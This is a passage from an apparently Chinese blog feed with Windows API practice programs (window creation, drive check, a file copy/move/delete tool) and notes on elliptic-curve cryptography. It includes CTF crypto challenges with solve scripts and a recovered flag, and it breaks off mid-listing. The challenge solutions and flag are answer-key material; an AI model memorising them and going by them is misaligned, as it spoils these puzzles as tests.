class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 窗口创建以及消息处理</span></span><br><span class="line">HINSTANCE hInst;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE ,HINSTANCE ,LPSTR ,<span class="type">int</span> )</span></span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    WNDCLASSEX wcx; <span class="comment">// 窗口类</span></span><br><span class="line">    HWND hwnd; <span class="comment">// 窗口句柄</span></span><br><span class="line">    MSG msg; <span class="comment">// 消息</span></span><br><span class="line">    BOOL ifGotMessage;</span><br><span class="line">    hInst = hInstance; <span class="comment">// 应用程序实例句柄</span></span><br><span class="line"></span><br><span class="line">    wcx.cbSize = <span class="built_in">sizeof</span>(wcx);</span><br><span class="line">    wcx.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcx.lpfnWndProc = MainWndProc;</span><br><span class="line">    wcx.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.hInstance = hInstance;</span><br><span class="line">    wcx.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);</span><br><span class="line">    wcx.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>,IDC_ARROW);</span><br><span class="line">    wcx.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">    wcx.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wcx.lpszClassName = <span class="built_in">TEXT</span>(<span class="string">&quot;MainWClass&quot;</span>);</span><br><span class="line">    wcx.hIconSm = (HICON)<span class="built_in">LoadImage</span>(</span><br><span class="line">        hInstance,</span><br><span class="line">        <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">5</span>),</span><br><span class="line">        IMAGE_ICON,</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CXSMICON),</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CYSMICON),</span><br><span class="line">        LR_DEFAULTCOLOR</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">RegisterClassEx</span>(&amp;wcx))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hwnd = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">        <span class="string">L&quot;MainWClass&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;HELLO WORLD&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        (HWND)<span class="literal">NULL</span>,</span><br><span class="line">        (HMENU)<span class="literal">NULL</span>,</span><br><span class="line">        hInstance,</span><br><span class="line">        (LPVOID)<span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!hwnd)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ShowWindow</span>(hwnd,nCmdShow);</span><br><span class="line">    <span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line">    <span class="keyword">while</span>(</span><br><span class="line">        (ifGotMessage = <span class="built_in">GetMessage</span>(&amp;msg,(HWND)<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>)) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; ifGotMessage != <span class="number">-1</span></span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="built_in">ExitThread</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串类型还是用TEXT自动适应方便点</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>判断光驱中是否有光盘</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE         512</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    CHAR szFileSystemNameBuffer[BUFSIZE];</span><br><span class="line">    DWORD dwLastError;</span><br><span class="line">    DWORD dwFileSystemFlags;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">TEXT</span>(<span class="string">&quot;PLZ input The rootpath of Drive!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;argc&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;argv[<span class="number">0</span>]&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetDriveType</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;D:/&quot;</span>))!=DRIVE_CDROM)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DRIVER %s ISNOT CD/DVD ROM\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里怎么改argv[1]的类型与GetDriveType形参类型都不匹配 麻了…</p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>删除 复制 移动文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-d&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">3</span>)&#123; <span class="comment">// 删除文件</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">DeleteFile</span>(argv[<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error when deleting file : %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Delete successfully!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-c&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// 复制文件</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],TRUE))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">GetLastError</span>()==<span class="number">0x50</span>) <span class="comment">// 文件存在</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;File %s is already exist, to overwrite? y/n: &quot;</span>,argv[<span class="number">3</span>]);</span><br><span class="line">                <span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">                <span class="keyword">if</span>(ch==<span class="string">&#x27;y&#x27;</span>||ch==<span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],FALSE))&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Error copying file, %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-m&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// 移动文件(重命名)</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">MoveFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error moving file: %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Move successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Invalid Parameters!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于命令行参数的类型转换 不管那么多 用strcmp和char(正常的c的写法)就行了…</p>]]></content>
      
      
      <categories>
          
          <category> ReverseEngineering </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-ECC</title>
      <link href="/Crypto-ECC/"/>
      <url>/Crypto-ECC/</url>
      
        <content type="html"><![CDATA[<p>学习ECC知识点以及相关题目</p><span id="more"></span><p>以前断断续续看过ECC 学的很不扎实 一些算法也没理解原理 现在有一定群论基础后再来学一遍</p><h1 id="相关知识点-定义"><a href="#相关知识点-定义" class="headerlink" title="相关知识点&#x2F;定义"></a>相关知识点&#x2F;定义</h1><p>其实<a href="https://ohmygodlin.github.io/ctf/crypto/2020/12/28/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81ECC%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" target="_blank">这篇</a>讲的挺好的</p><h2 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h2><p>ECC里面只考虑 <code>Ep : y^2 === x^3 + a*x + b mod p</code> 形式</p><ul><li>Δ &#x3D; -16(4*a^3+27b)≠0 保证曲线光滑</li><li>a,b ∈ K K为E的基础域</li><li>点O∞是曲线的唯一无穷远点</li></ul><h2 id="椭圆曲线上的加法"><a href="#椭圆曲线上的加法" class="headerlink" title="椭圆曲线上的加法"></a>椭圆曲线上的加法</h2><p>借佬图：<br><img src="https://s2.loli.net/2023/12/08/gTdyjkJezQV8IhM.png" alt="img"></p><p>要熟练掌握公式 好多题目都可以用加法公式转成代数方程来解</p><h2 id="What-is-ECC"><a href="#What-is-ECC" class="headerlink" title="What is ECC?"></a>What is ECC?</h2><p><img src="https://s2.loli.net/2023/12/08/miK8AzOIstlZ3xa.png" alt="img"></p><h2 id="Sage相关函数实现"><a href="#Sage相关函数实现" class="headerlink" title="Sage相关函数实现"></a>Sage相关函数实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># y^2 === x^3 + a*x + b mod p</span></span><br><span class="line"></span><br><span class="line">E.random_point() <span class="comment"># 在椭圆曲线E上随机选一点</span></span><br><span class="line"></span><br><span class="line">E.set_order() <span class="comment"># 设置椭圆曲线的阶</span></span><br><span class="line"></span><br><span class="line">E.point((x,y)) <span class="comment"># 创建一个曲线上的点对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解私钥 k K = k*G</span></span><br><span class="line"><span class="comment"># 自动选择 BSGS 或者 Pohlig-Hellman算法</span></span><br><span class="line">discrete_log(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">G.discrete_log(K)</span><br><span class="line"></span><br><span class="line">E.order() <span class="comment"># 计算椭圆曲线上点的阶</span></span><br><span class="line"><span class="built_in">print</span>(factor(E.order()))</span><br><span class="line"><span class="comment"># 2 * 3^3 * 5 * 7 * 212117 * 302426983 * 10362951863095936421891634612647340060175499</span></span><br><span class="line"><span class="built_in">print</span>(*factor(E.order()))</span><br><span class="line"><span class="comment">#(2, 1) (3, 3) (5, 1) (7, 1) (212117, 1) (302426983, 1) (10362951863095936421891634612647340060175499, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用Pollard rho算法求解私钥</span></span><br><span class="line">discrete_log_rho(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用Pollard Lambda算法求解私钥，能够确定所求值在某一小范围时效率较高</span></span><br><span class="line">discrete_log_lambda(K,G,bound,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>通过例题来熟悉这些概念和方法吧</p><h2 id="2022巅峰极客-point-power"><a href="#2022巅峰极客-point-power" class="headerlink" title="2022巅峰极客 point-power"></a>2022巅峰极客 point-power</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">42</span></span><br><span class="line">p=getPrime(<span class="number">600</span>)</span><br><span class="line">a=bytes_to_long(flag)</span><br><span class="line">b=randrange(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">E=EllipticCurve(GF(p),[a,b])</span><br><span class="line">G=E.random_element()</span><br><span class="line"></span><br><span class="line">x1,y1,_=G</span><br><span class="line">G=<span class="number">2</span>*G</span><br><span class="line">x2,y2,_=G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;x1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;x2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line"><span class="string">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line"><span class="string">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line"><span class="string">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以直接用加法公式<br>写出来消元得到只含x1的方程 sage解就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line">b = <span class="number">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line">x1 = <span class="number">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line">x2 = <span class="number">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;a&gt; = PolynomialRing(Zmod(p))</span></span><br><span class="line"><span class="comment"># f = (3*x1**2+a)^2-4*(x1^3+a*x1+b)*(2*x1+x2)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># print(f.roots())</span></span><br><span class="line"></span><br><span class="line">[(<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>, <span class="number">1</span>), (<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>, <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">flags = [<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>,<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>]</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fa76cfb1-0052-4416-914d-91517bcebd52&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="WatevrCTF2019-ECC-RSA"><a href="#WatevrCTF2019-ECC-RSA" class="headerlink" title="WatevrCTF2019 ECC-RSA"></a>WatevrCTF2019 ECC-RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P521 <span class="keyword">as</span> Curve</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_rsa_primes</span>(<span class="params">G</span>):</span><br><span class="line">urand = bytes_to_long(urandom(<span class="number">521</span>//<span class="number">8</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = getrandbits(<span class="number">521</span>) ^ urand</span><br><span class="line"></span><br><span class="line">Q = s*G</span><br><span class="line"><span class="keyword">if</span> isPrime(Q.x) <span class="keyword">and</span> isPrime(Q.y):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ECC Private key:&quot;</span>, <span class="built_in">hex</span>(s))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RSA primes:&quot;</span>, <span class="built_in">hex</span>(Q.x), <span class="built_in">hex</span>(Q.y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Modulo:&quot;</span>, <span class="built_in">hex</span>(Q.x * Q.y))</span><br><span class="line"><span class="keyword">return</span> (Q.x, Q.y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(), byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">ecc_p = Curve.p</span><br><span class="line">a = Curve.a</span><br><span class="line">b = Curve.b</span><br><span class="line"></span><br><span class="line">Gx = Curve.gx</span><br><span class="line">Gy = Curve.gy</span><br><span class="line">G = Point(Gx, Gy, curve=Curve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = gen_rsa_primes(G)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_out = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;ECC Curve Prime: &quot;</span> + <span class="built_in">hex</span>(ecc_p) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve a: &quot;</span> + <span class="built_in">hex</span>(a) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve b: &quot;</span> + <span class="built_in">hex</span>(b) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gx: &quot;</span> + <span class="built_in">hex</span>(Gx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gy: &quot;</span> + <span class="built_in">hex</span>(Gy) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;e: &quot;</span> + <span class="built_in">hex</span>(e) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;p * q: &quot;</span> + <span class="built_in">hex</span>(n) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line">file_out.write(<span class="string">&quot;ciphertext: &quot;</span> + <span class="built_in">hex</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ECC Curve Prime: 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">Curve a: -0x3</span><br><span class="line">Curve b: 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span><br><span class="line">Gx: 